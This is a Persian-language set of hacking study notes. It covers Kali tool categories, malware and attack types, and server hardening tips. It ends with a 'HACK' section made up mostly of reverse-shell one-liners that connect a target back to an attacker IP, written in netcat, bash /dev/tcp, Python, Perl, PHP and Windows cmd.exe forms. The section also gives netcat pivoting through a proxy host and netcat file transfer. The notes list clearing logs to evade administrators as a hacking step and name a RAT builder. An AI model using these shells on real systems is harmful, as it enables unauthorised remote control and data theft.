<div dir="rtl">

# 📍️ Concepts مفاهیم

- **InformationGathering:** این قسمت شامل ابزار های جمع‌آوری اطلاعات است که در این دسته قرار دارند.
- **VulnerabilityAnalysis:** در این بخش ابزار های اسکنر برای پیدا کردن اسیب پذیری ها قرار دارند.
- **WebApplicationAnalysis:** کاربرد این مجموعه ابزار در زمینه جستجو و تست اسیب پذیری در برنامه های تحت وب است.
- **DatabaseAssessment:** با استفاده از ابزار های این دسته می توانید اقدام به انالیز برای کشف حفره های امنیتی در دیتابیس یا پایگاه داده کنید.
- **PasswordAttacks:** در این دسته بندی ابزار هایی برای انالیز و کرک پسورد ها و همچنین ابزار هایی برای کرک نرم‌افزار ها قرار دارند.
- **WirelessAttacks:** این بخش از منو کالی لینوکس ابزار های مربوط به تست نفوذ شبکه های وایرلس را به خود اختصاص داده است.
- **ReverseEngineering:** در این بخش مجموعه ابزار هایی برای مهندسی معکوس قرار داده شده است.
- **ExploitationTools:** ابزار های بهره‌برداری از آسیب پذیری ها و استفاده از اکسپلویت ها هستند، که در این قسمت می توانید مشاهده و استفاده کنید.
- **Sniffing(بوکشیدن):** شنود و سرقت و نظارت و جمع‌آوری اطلاعات از ترافیک شبکه[Wireshark، tcpdump، Ettercap]
- **Spoofing(جعل):** فرد یا سیستم غیرمجاز خود را منبع معتبر معرفی کند[مهاجم IP یا Email(جعل‌آدرس‌ایمیل‌فرستنده) یا DNS(هدایت‌به‌سایت‌جعلی) یا ARP(تغییر مک) یا CallerID(تلفنی) خود را تغییر می‌دهد تا معتبر جلوه کند]
    - **IPSpoofing:** مهاجم آدرس IP خود را تغییر می‌دهد تا به نظر برسد که از یک منبع معتبر یا شناخته‌شده ارسال می‌شود[رایج در حملات DDOS]
- **PostExploitation:** این دسته از ابزار ها مانند ابزار های جمع اوری اطلاعات هستند که پس از تست نفوذ از ان ها استفاده می شود و می توان از این ابزار ها برای استخراج و نگهداری اطلاعات به سرقت رفته استفاده کرد.
- **Forensics:** این دسته از ابزار های فارنزیک یا جرم شناسی در ردیابی و پیدا کردن نفوذگر کمک شایانی می کند.
- **ReportingTools:** مجموعه ای که در این قسمت وجود دارند برای گرفتن گزارش تست نفوذ استفاده می شوند.
- **SocialEngineering Tools:** با استفاده از ابزار های این بخش می توان حملات مهندسی اجتماعی را پیاده‌سازی کرد.
- **Doxing:** این مفهوم به معنی عمومی کردن اطلاعات یک شخص داخل اینترنت با هدف تحقیر و تهدید هست.
- **Fragmentation:** فرگمنتیشن زمانی رخ می‌دهد که بسته‌های داده در شبکه به قطعات کوچکتر تقسیم می‌شوند تا بهتر منتقل شوند. این تکنیک گاهی برای دور زدن Firewall ها یا سیستم‌های تشخیص نفوذ استفاده می‌شود.
- **Exploit:** اکسپلویت به معنای استفاده کردن از یک آسیب‌پذیری برای انجام یک حمله است
- **Vulnerability(آسیب‌پذیری):** یک نقص یا ضعف در سیستم (مثل نرم‌افزار، سخت‌افزار یا شبکه) است که مهاجم می‌تواند از آن برای نفوذ یا آسیب استفاده کند
- **ActiveAttacks[حملات‌فعال]:** در حملات فعال، مهاجم به صورت مستقیم و تعاملی به سیستم یا شبکه هدف حمله می‌کند و تغییرات ناخواسته‌ای در داده‌ها یا سیستم‌ها ایجاد می‌کند.
- **PassiveAttacks[حملات‌غیرفعال]:** در این نوع حملات، مهاجم تنها ترافیک شبکه یا داده‌ها را شنود می‌کند بدون اینکه تغییری در سیستم ایجاد کند. هدف این حملات معمولاً Information Gathering است، بدون اینکه برای سیستم هدف مخرب به نظر برسد.
- **bypass**: «گذرگاه‌فرعی» یا «ازراه‌فرعی‌رفتن» یا «تقاطع‌که‌راه‌فرعی‌دارد»

## انواع بدافزار 📌️

- **Virus(ویروس)**: قطعه کد که توسط بدافزارنویس نوشته شده و طبق روال از قبل تعریف و تعیین شده عمل می‌کند(قطعه کد خرابکاری)
- **Trojan(تروجان)**: قطعه کد که توسط بدافزارنویس نوشته شده و کنترل آن در دست بدافزار نویس است(کنترل راه دور و گاهی هم به‌صورت خودکار تصمیم و عمل می‌کند). همچنین دیتا جمع‌آوری کرده و درزمان خاص اطلاعات را ارسال می‌کند
- **RootKit(روت کیت)**: کیت نرم‌افزاری خیلی خطرناک(بدلیل برخورداری از دسترسی اصلی )
- **Malware(کرم)**: قطعه کد هوشمندبا قابلیت تصمیم‌گیری در شرایط برای تحقق هدف‌خاص(مثلا نیروگاه اتمی) و در نهایت درصورت نیاز ارسال دیتا به سرور

# 📍️ AttacksType(انواع حملات)

- MITM (Man-in-the-Middle)
- DoS
- DDoS
- دیکشنری
- BruteForce
- Malware
- SniffingAttack
- SQL injection
- Cross-site scripting (XSS)
- NoFunctionLevelControl
- BrokenAuthentication

# 📍️ Applications ابزارهای و برنامه‌ها

- IPTables
- NfTable
- Fail2ban: رصد لاگ و مسدودسازی مهاجم پیرو چندین ورود ناموفق
    - از iptables و firewalld برای ممنوع کردن آدرس های IP استفاده می کند
- SELinux
- TCPWrappers
- Nessus: اسکن کردن آدرس سایت
- Acunetic: اسکن کردن آدرس سایت
- MaltegoTungsten: کشیدن چارت اطلاعات سایت
- Crunch: برنامه‌ای برای تولید پسورد لیست
    - crunch <min-len> <max-len> [options]
    - crunch 4 5 1234567890 -o /tmp/Output.txt #از اعداد ۰تا۹ پسورد تولید کند و باید تمام موارد تولید شده ۴ رقمی و ۵ رقمی باشد و در فایل خروجی بریزد
    - crunch 4 5 -o /tmp/Output.txt #اگر عددی یا حروفی انتخاب نکنید همه موارد انتخاب خواهد شد
- نرم‌آفزار Nuclear Rat: سرور میسازد و تروجان ایجاد می‌کند

# 📍️ AntiHack(مقابله با هک)

- بروزرسانی کرنل و نرم افزارها
- غیرفعال کردن root login توسط پارامترPermitRootLogin=no در فایل sshd_config
- تغییر شماره پورت‌ها[مخصوصا SSH]
- حتی المقدور محدود کردن دسترسی‌ها به‌صورت فقط فیزیکی به سرور(بستن ریموت‌ها)
- غیرفعال نمودن IPv6: مهاجمین معمولا ترافیک را از ورژن۶ ارسال می‌کنند
    - باز کردن فایل /etc/sysctl.d/99-sysctl.conf و تغییر مقدار به ۱ برای پارامترهای[net.ipv6.conf.all.disable_ipv6 = 1] [net.ipv6.conf.default.disable_ipv6 = 1][ net.ipv6.conf.lo.disable_ipv6 = 1] در ادامه دستور sudo sysctl -p ودر ادامه فایل /proc/sys/net/ipv6/conf/all/disable_ipv6 را باز کرده و باید مقادیر بالا عدد یک داشته باشند
- استفاده از SFTP بجای FTP
    - TTP رمزنگاری ندارد
    - FTPS فقط رمزنگاری اعتبارنامه‌ها و نه انتقال فایل[FTP over TLS]
    - SFTP: انتقال دیتا از بستر پروتکل «اس‌اس‌اچ»[FTP over SSH] تمام داده‌ها، از جمله اعتبارنامه‌ها و فایل‌های در حال انتقال را به طور کامل رمزگذاری می کند
        - sftp -oPort=customport user@server_ipaddress
- راه‌اندازی فایروال داخلی سیستم
- نصب آنتی ویروس
- بررسی لاگ ها و تجزیه و تحلیل وقایع
- کنترل تعدد سطح دسترسی یوزرها [افراد مجاز یوزر روت]

# 📍️ Mentions

- Kali Alterntives OS: 1-Parrot os 2-Backbox os

## 📌️ Five Step for do Hacking...

1. Reconnaissance (شناسایی) : جمع‌آوری اطلاعات اولیه درباره هدف.
2. Scanning : استفاده از ابزارهای خاص برای شناسایی نقاط ضعف سیستم ها و شبکه ها.
3. Gaining Access (گرفتن دسترسی) : بهره‌برداری از آسیب پذیری‌ها برای نفوذ به سیستم و کسب دسترسی.
4. Maintaining Access (حفظ دسترسی) : حفظ دسترسی به سیستم برای مدت زمان طولانی تر بدون شناسایی.
5. Clearing Tracks (پاک کردن رد پاها) : پاک کردن لاگ ها و ردپاها برای جلوگیری از شناسایی توسط مدیران سیستم.

# 📍️ HACK

## 📌️ 1.GetShell

### 1.1.Linux

> روش اول

```shell
nc 10.0.20.206 4444 -e /bin/bash # Target
nc -lvp 4444: # Attacker(10.0.20.206)
```

> روش دوم

```shell
nc 10.0.20.206 4444 # Target
nc -lvp 4444 -e /bin/bash # Attacker(10.0.20.206)
```

> روش سوم

```shell
bash -i >& /dev/tcp/10.0.20.206/4444 0>&1 # Target
nc -lvp 4444 # Attacker(10.0.20.206)
```

---

#### 1.1.1.proxy

<div dir="ltr">

- 10.11.1.16 attack box:
- 10.11.1.96 target host:
- 10.11.1.250 pivot point:

</div>

```shell
# Target[10.11.1.96]
nc -lvp 4444 -e /bin/sh

# Proxy[IP: 10.11.1.250]
nc -v 10.11.1.16 4444 -e "nc -v 10.11.1.96 4444"

# Hacker[IP: 10.11.1.16]
nc -lvp 4444

```

### 1.2.Windows

```
nc.exe  10.0.20.206 4444 -e cmd.exe # Target
nc -lvp 4444 # Attacker(10.0.20.206)
```

---

#### 1.2.1.proxy

<div dir="ltr">

- Target[Windows1][10.11.1.198]
- Proxy [Windows2][10.11.1.199]
- Hacker[LinuxKali][10.11.1.16]

</div>

> روش اول

```shell
# Target(Windows1):needs to attach incoming commands on port 4444 to CMD.exe and redirect the output back to Windows Proxy on port 4444
nc -lvp 4444 -e cmd.exe 

# Proxy(Windows2): needs to direct incoming traffic on port 3333 to Windows Target on port 4444 and input traffic from Windows Target must be send to Kali Linux output on port 2222
nc.exe 10.11.1.16 3333 | nc.exe 10.11.1.198 4444 | nc.exe 10.11.1.16 2222

# Hacker(Linux): should be sending commands to Windows Proxy on port 3333 and receive input from Windows Proxy on port 4444
nc -lvp 3333 ; nc -lvp 4444
```

> روش دوم

```shell
# Target(Windows):
nc -lvp 4444 -e cmd.exe

# Proxy(Windows):
nc -v 10.11.1.16 4444 -c "nc -v 10.11.1.198 4444"

# Hacker(Linux):
nc -lvp 4444

```

### 1.3.python

```shell
# Target:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.20.206”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);'

# Attacker(10.0.20.206):
nc -lvp 4444
```

### 1.4.Perl

```shell
# Target:
perl -e ‘use Socket;$i=”10.0.20.206″;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

# Attacker(10.0.20.206):
nc -lvp 4444
```

### 1.5.PHP

```shell
# Target:
php -r '$sock=fsockopen(“10.0.20.206”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);'

# Attacker(10.0.20.206):
nc -lvp 4444

```

## 📌️ 2.send Data

> انتقال دیتا از طریق برنامه Netcat

```shell
nc -l -p 55000 > /tmp/FIle.txt # Server1
netcat <IPserver1> 55000 < File.txt # server2
```

```shell
nc -l -p 55000 > /tmp/FIle.txt # Server1
nc <IPserver1> 55000 < File.txt # server2
```

</div>
